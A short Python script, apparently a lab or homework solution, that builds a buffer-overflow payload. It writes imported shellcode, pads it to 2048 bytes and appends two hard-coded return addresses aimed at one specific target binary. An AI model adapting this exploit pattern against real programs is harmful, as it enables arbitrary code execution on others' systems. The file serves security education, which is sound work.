#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(shellcode+b"\x11"*(2048-len(shellcode))+pack("<II", 0xfffeedc4, 0xfffef5d0))
